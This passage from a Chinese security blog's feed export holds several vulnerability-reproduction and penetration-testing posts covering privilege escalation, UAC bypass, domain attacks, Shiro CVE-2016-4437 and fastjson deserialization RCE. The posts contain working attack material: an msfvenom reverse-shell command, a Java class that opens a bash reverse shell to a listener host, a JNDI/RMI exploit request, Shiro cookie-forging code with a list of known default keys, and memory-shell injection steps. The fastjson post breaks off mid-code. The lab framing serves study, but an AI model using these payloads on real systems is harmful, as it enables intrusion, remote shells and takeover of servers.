href="https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c%E3%80%82%E4%B8%8A%E4%BC%A0%E8%AF%A5%E8%84%9A%E6%9C%AC%E7%9A%84exe%EF%BC%8C%E8%BF%98%E6%9C%89%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshell.exe%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8C%EF%BC%8C%E8%BF%90%E8%A1%8Cexploit%E5%8D%B3%E5%8F%AF%E3%80%82">https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c。上传该脚本的exe，还有生成一个shell.exe到服务器里，运行exploit即可。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>当得到High之后，我们可以使用<a href="https://github.com/k4sth4/UAC-bypass/blob/main/psexec64.exe">psexec64</a>提权，接收返回的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe</span><br></pre></td></tr></table></figure><h4 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h4><p>MSF里面有很多工具，我觉得还是得看上面的条件才去使用payload。bypassuac注意需要用户在管理员组，并且uac是开启状态，uac如果是关闭状态是可以直接getsystem进行提权的。</p><p>win7(这个高级用不了，去其他的把）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>win10：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure><h4 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h4><p>工具：uacme</p><h3 id="第三方服务"><a class="markdownIt-Anchor" href="#第三方服务"></a> 第三方服务</h3><h4 id="打印机"><a class="markdownIt-Anchor" href="#打印机"></a> 打印机</h4><p><a href="https://github.com/jacob-baines/concealed_position">https://github.com/jacob-baines/concealed_position</a></p><p>通常有：</p><blockquote><p>CVE-2021-35449 - Lexmark 通用打印驱动程序 LPE</p><p>CVE-2021-38085 - 佳能 TR150 打印驱动程序 LPE</p><p>CVE-2019-19363 - Ricoh PCL6 打印驱动程序 LPE</p><p>CVE-2020-1300 - Windows 打印后台处理程序 LPE</p></blockquote><h4 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h4><p>见第一篇</p><h3 id="win漏洞"><a class="markdownIt-Anchor" href="#win漏洞"></a> Win漏洞</h3><p>使用漏洞先要对补丁进行扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MSF&gt; post/windows/gather/enum_patches # 扫描补丁</span><br><span class="line">MSF&gt; use post/multi/recon/local_exploit_suggester # 列举可用EXP</span><br><span class="line">或</span><br><span class="line">SearchExploit&gt; wmic qfe list full|findstr /i hotfix # 或者 systeminfo</span><br><span class="line">SearchExploit&gt; searchsploit &lt;OS NAME&gt; &lt;OS Version&gt; # 先去expoitDB上查一下</span><br><span class="line">或Empire</span><br><span class="line">Empire&gt; usemodule privesc/watson</span><br><span class="line">Empire&gt; execute</span><br></pre></td></tr></table></figure><p>常用漏洞列表</p><blockquote><p><strong>MS08-067</strong></p><p><strong>MS14-058[KB3000061]</strong>：Windows OLE 远程代码执行漏洞，可以用来提权，一般CS用得比较多。</p><p><strong>MS14-068[KB3011780]</strong>：制作金银票据的重要漏洞，可以获取域控ntlm。现在好像很难遇到了。</p><p><strong>MS15-051[KB3045171]</strong>：用得比较多</p><p><strong>MS16-032[KB3124280]</strong></p><p><strong>MS16-075</strong></p><p><strong>MS16-135[KB3199135]</strong></p><p><strong>MS17-010[KB4013389]</strong>：永恒之蓝</p><p><strong>CVE-2018-8120</strong>：MSF常用</p><p><strong>CVE-2019-0708</strong></p><p><strong>CVE-2019-0803</strong></p><p><strong>CVE-2019-1322 &amp; CVE-2019-1405</strong></p><p><strong>CVE-2020-1472</strong>：zeroLOGON，也比较常出现</p></blockquote><h2 id="linux本地提权"><a class="markdownIt-Anchor" href="#linux本地提权"></a> Linux本地提权</h2><h3 id="linux漏洞"><a class="markdownIt-Anchor" href="#linux漏洞"></a> Linux漏洞</h3><p>先检测一下，哪些漏洞可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line">https://github.com/PenturaLabs/Linux_Exploit_Suggester</span><br><span class="line">https://github.com/jondonas/linux-exploit-suggester-2</span><br><span class="line">https://github.com/belane/linux-soft-exploit-suggester</span><br></pre></td></tr></table></figure><p>常用漏洞列表</p><blockquote><p>CVE-2016-5195：脏牛，<a href="https://github.com/FireFart/dirtycow">参考1</a>，<a href="https://github.com/gbonacini/CVE-2016-5195">参考2</a></p><p>CVE-2017-16995</p><p>CVE-2019-13272</p><p>CVE-2021-4034：<a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p>CVE-2021-3560</p><p>CVE-2022-0847</p><p>CVE-2022-23222：<a href="https://github.com/tr3ee/CVE-2022-23222">https://github.com/tr3ee/CVE-2022-23222</a></p></blockquote><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><h2 id="windows权限维持"><a class="markdownIt-Anchor" href="#windows权限维持"></a> Windows权限维持</h2><h1 id="域内渗透"><a class="markdownIt-Anchor" href="#域内渗透"></a> 域内渗透</h1><h2 id="横向多平台到控制"><a class="markdownIt-Anchor" href="#横向多平台到控制"></a> 横向（多平台）到控制</h2><h2 id="代理-隧道与转发"><a class="markdownIt-Anchor" href="#代理-隧道与转发"></a> 代理、隧道与转发</h2><h1 id="域控"><a class="markdownIt-Anchor" href="#域控"></a> 域控</h1><h2 id="获取域控权限"><a class="markdownIt-Anchor" href="#获取域控权限"></a> 获取域控权限</h2><h3 id="gpp目录账号密码"><a class="markdownIt-Anchor" href="#gpp目录账号密码"></a> GPP目录账号密码</h3><p>搜集GPP目录，其中可能保存的有域账号密码，不仅仅是存在XML里的那些，NETLOGON目录中的某些脚本同样也可能保存有账号密码。</p><h3 id="kerberoast攻击"><a class="markdownIt-Anchor" href="#kerberoast攻击"></a> kerberoast攻击</h3><p>服务票据hash破解，尤其是域管用户的kerberoast攻击，该攻击主要通过</p><p>批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</p><p>Kerberos 委派利用</p><p>爆破LDAP</p><p>Exchange特定ACL滥用</p><p>SSP 截获关键服务器登录密码</p><p>利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞… ],在内网循环抓各类密码,直至</p><p>抓到域管密码</p><p>抓到域管令牌</p><p>DNSAdmin 组成员滥用 [ 加载执行恶意dll ]</p><p>LAPS</p><p>MS14-068 [ 如今实际中已很少遇到了 ]</p><p>LLMNR/NBNS欺骗  + SMB relay [ 真实实战中其实用的并不多 ]</p><h1 id="权限维持"><a class="markdownIt-Anchor" href="#权限维持"></a> 权限维持</h1><h1 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>tomcat复现</title>
    <link href="https://j3f5.github.io/articles/2023/07/20/tomcat%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/07/20/tomcat%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-20T13:01:39.000Z</published>
    <updated>2023-07-20T13:01:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a class="markdownIt-Anchor" href="#文件包含漏洞"></a> 文件包含漏洞</h1><p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p><img src="/images/tomcat%E5%A4%8D%E7%8E%B0/image-20230720214732443.png" alt="image-20230720214732443" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#文件包含漏洞&quot;&gt;&lt;/a&gt; 文件包含漏洞&lt;/h1&gt;
&lt;p&gt;由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 T</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>shiro复现</title>
    <link href="https://j3f5.github.io/articles/2023/07/20/shiro%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/07/20/shiro%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-20T01:40:10.000Z</published>
    <updated>2023-07-20T01:40:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p><strong>漏洞编号：</strong> CVE-2016-4437</p><p>Apache Shiro框架提供了记住密码的功能（RememberMe），默认使用了CookieRememberMeManager，加密的用户信息序列化后存储在名为<code>rememberMe</code> 的Cookie 中。导致可以利用 Shiro 的默认密钥伪造用户 Cookie ，触发 Java 反序列化漏洞，导致可以在目标机器上执行任意命令。实质上是一个<strong>反序列化漏洞</strong>。</p><p><strong>影响版本：</strong></p><p>Apache Shiro &lt;= 1.2.4</p><p><strong>漏洞特征：</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><h2 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h2><p>在Shiro框架下，用户登陆成功后会生成一个经过加密的Cookie。其Cookie的Key的值为RememberMe，Value的值是经过<strong>序列化</strong>、<strong>AES加密</strong>和<strong>Base64编码</strong>后得到的结果。</p><p>服务端在接收到一个Cookie时，会按照如下步骤进行解析处理：</p><p>1.检索RememberMe Cookie的值</p><p>2.进行Base64解码</p><p>3.进行AES解码</p><p>4.进行反序列化操作</p><p>在第4步中的调用反序列化时未进行任何过滤，进而可以导致触发远程代码执行漏洞。</p><p>由于使用了AES加密，成功利用该漏洞需要获取AES的加密密钥，<strong>在Shiro1.2.4版本之前AES的加密密钥为硬编码</strong>，其默认密钥的Base64编码后的值为<code>kPH+bIxk5D2deZiIxcaaaA==</code>，于是就可得到Payload的构造流程：</p><pre><code>恶意命令--&gt;序列化--&gt;AES加密--&gt;base64编码--&gt;发送Cookie</code></pre><p>目前官方通过去掉硬编码的密钥每次生成一个密钥来解决其漏洞，但可以通过搜索引擎等方式收集到不同的密钥，提高对该漏洞的利用成功。</p><p>Q1：这个AES的密钥是啥：默认密钥的Base64编码后的值为<code>kPH+bIxk5D2deZiIxcaaaA==</code></p><p>Q2：漏洞特征是啥？</p><blockquote><p>header=“rememberme=deleteMe”</p><p>header=“shiroCookie”</p></blockquote><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><p><a href="https://github.com/fupinglee/ShiroScan">https://github.com/fupinglee/ShiroScan</a></p><p><a href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a></p><p><a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p><p><a href="https://github.com/j1anFen/shiro_attack/releases/tag/2.2">https://github.com/j1anFen/shiro_attack/releases/tag/2.2</a></p><h2 id="修复方案"><a class="markdownIt-Anchor" href="#修复方案"></a> 修复方案</h2><ul><li>升级Shiro至新版本；</li><li>更改默认密钥；</li></ul><h1 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h1><h2 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h2><p>登录框有：</p><p>抓包看一下，发现特征 rememberMe=deleteMe，判断其使用了CookieRememberMeManager，并且可能存在漏洞。：</p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720104352684.png" alt="image-20230720104352684" /></p><p>利用：生成poc（使用<code>java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</code>）</p><p>然后将以下代码放到shiro环境中，生成cookie</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.shirodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/home/j3fffff/Mywork/Tools/Java&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将生成的payload放在cookie中进行发送即可执行。因为没有shiro环境，遂罢，使用工具攻击</p><h2 id="工具-2"><a class="markdownIt-Anchor" href="#工具-2"></a> 工具</h2><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720111310199.png" alt="image-20230720111310199" /></p><p>注意URL必须填上login的界面，出现rememberme才算。对于密钥的爆破，现在有搜集到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA==</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br></pre></td></tr></table></figure><p>注入内存马：</p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720112032367.png" alt="image-20230720112032367" /></p><p>然后连冰蝎：</p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720111927629.png" alt="image-20230720111927629" /></p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720111958199.png" alt="image-20230720111958199" /></p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="shiro550-与-shiro721的区别"><a class="markdownIt-Anchor" href="#shiro550-与-shiro721的区别"></a> shiro550 与 shiro721的区别</h2><p><strong>Shiro550 反序列化漏洞原理：</strong></p><p>记住我的功能开启之后，会有Cookie 数据，Cookie 数据其实就是加密后的经过序列化的用户对象，也就是二进制字节流。</p><p>加密算法是AES 算法，算法很安全，但是秘钥是固定的，并且存储于源码中。</p><p><strong>Shiro721 利用条件：</strong></p><p>AES 秘钥不在是固定的了，但是此秘钥可以被爆破</p><p>需要提供一个合法用户，再点击remmber me ，成功登录之后，获取Cookie remmber-me 的值。</p><p><strong>区别在于：</strong></p><p>Shiro-550，Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。Shiro-721，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#背景&quot;&gt;&lt;/a&gt; 背景&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt; CVE-2016-4437&lt;/p&gt;
&lt;p&gt;Apache Shiro框架提供了记住密码的功能（Rem</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>fastjson复现</title>
    <link href="https://j3f5.github.io/articles/2023/07/18/fastjson%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/07/18/fastjson%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-18T12:03:44.000Z</published>
    <updated>2023-07-18T12:03:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><p>依照上面的注解，我也尝试说一遍。</p><p>fastjson 1.2.4 rce 是通过反序列化实现的。fastjson提供一个能够将json反序列化成对象的功能，当然也有序列化啦。但是一般序列化与反序列化使用的是<code>setter/getter</code>，还有一种是<code>AutoType</code>。</p><ol><li><p>第一种：当A与B同时是接口C的实现，如果通过这种方法序列化，则会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;C&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;</span><br><span class="line">&#123;&quot;C&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;</span><br></pre></td></tr></table></figure><p>此时反序列化后分不清是A还是B</p></li><li><p><code>AutoType</code>在当中加入<code>@type</code>标识类对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;C&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.A&quot;, &quot;price&quot;:0.5 &#125; &#125;</span><br><span class="line">&#123; &quot;C&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.B&quot;, &quot;price&quot;:5000 &#125; &#125;</span><br></pre></td></tr></table></figure><p>则反序列化后可以实现分清AB</p></li></ol><h2 id="漏洞来源"><a class="markdownIt-Anchor" href="#漏洞来源"></a> 漏洞来源</h2><p>使用<code>AutoType</code>功能进行序列号的JSON字符会带有一个<code>@type</code>来标记其字符的原始类型，在反序列化的时候会读取这个<code>@type</code>，来试图把JSON内容反序列化到对象，并且会调用这个库的<code>setter</code>或者<code>getter</code>方法，然而，<strong><code>@type</code>的类有可能被恶意构造</strong>，只需要合理构造一个JSON，使用<code>@type</code>指定一个想要的攻击类库就可以实现攻击。</p><p>常见的有sun官方提供的一个类<code>com.sun.rowset.JdbcRowSetImpl</code>，其中有个<code>dataSourceName</code>方法支持传入一个<code>rmi</code>的源，只要解析其中的<code>url</code>就会支持远程调用！</p><h2 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h2><p><a href="https://juejin.cn/s/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">参考文章</a>~一共有三种构造payload的方式，分别为：</p><ol><li><p>基于JNDI注入【com.sun.rowset.JdbcRowSetImpl】</p><ol><li>编写恶意java代码，制作恶意class，并放在服务器A中</li><li>在B服务器开启RMI服务（目录），指定服务器A为服务器</li><li>制造rmi请求（该请求为获取一个恶意类），传入受害主机C，主机C则会请求B获得恶意类，B请求A中的恶意类并传入C中，C执行</li></ol><p>如果该恶意类为反弹shell，即可执行shell</p></li><li><p>基于ClassLoader</p></li><li><p>基于TemplatesImpl</p></li></ol><p>实践参考：<a href="https://cloud.tencent.com/developer/article/1785575">https://cloud.tencent.com/developer/article/1785575</a></p><h1 id="jndi注入需要出网"><a class="markdownIt-Anchor" href="#jndi注入需要出网"></a> JNDI注入（需要出网）</h1><h2 id="条件"><a class="markdownIt-Anchor" href="#条件"></a> 条件</h2><p>主机：192.168.52.1</p><p>受害主机：192.168.52.128</p><p>反弹shell接收主机：192.168.52.129</p><ul><li>受害主机能够出网</li></ul><h2 id="准备恶意代码"><a class="markdownIt-Anchor" href="#准备恶意代码"></a> 准备恶意代码</h2><p>主机准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class evil&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.52.129/7777 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>javac evil.java</code>完成编译。注意版本为java8</p><p>挂在http服务器目录下，这里使用phpstudy搭建</p><h2 id="运行rmi服务"><a class="markdownIt-Anchor" href="#运行rmi服务"></a> 运行RMI服务</h2><p>主机准备</p><p>下载<a href="https://github.com/mbechler/marshalsec%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%9E%84%E5%BB%BA%E4%BB%A3%E7%A0%81%EF%BC%9A">https://github.com/mbechler/marshalsec，并且构建代码：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><blockquote><p>IDEA自带maven，所以可以将它加入到环境变量中</p></blockquote><p>然后进入<code>target</code>目录，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Tmp\marshalsec\target&gt; java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.52.1/#evil&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/2e846ae469d8f1e5d2630296bb3aecc.png" alt="2e846ae469d8f1e5d2630296bb3aecc" /></p><h2 id="执行payload"><a class="markdownIt-Anchor" href="#执行payload"></a> 执行payload</h2><p>burpsuite请求抓包，或者直接使用apipost也行。构建成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.52.128:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.52.1:9999/evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行返回，如果是nc则没有什么返回。</p><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/849d2a1e82c779c4d9875982f495b8b.png" alt="849d2a1e82c779c4d9875982f495b8b" /></p><h2 id="效果"><a class="markdownIt-Anchor" href="#效果"></a> 效果</h2><p>创建目录：</p><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/9940b1b431f5104bb1a36abf39e2a92.png" alt="9940b1b431f5104bb1a36abf39e2a92" /></p><p>反弹shell</p><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/5277062e21f0a0b70f6dfae1a3b314b.png" alt="5277062e21f0a0b70f6dfae1a3b314b" /></p><h1 id="classloaderbcel"><a class="markdownIt-Anchor" href="#classloaderbcel"></a> ClassLoader（BCEL）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @Author kilo、冰室/ki10Moc</span><br><span class="line"> * @date 2022/11/7</span><br><span class="line"> * @time 14:30</span><br><span class="line"> * @blog http://ki10.top</span><br><span class="line"> **/</span><br><span class="line"></span><br><span class="line">public class FastJsonBcel &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String payload2 = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    &#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;ki10\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot; +</span><br><span 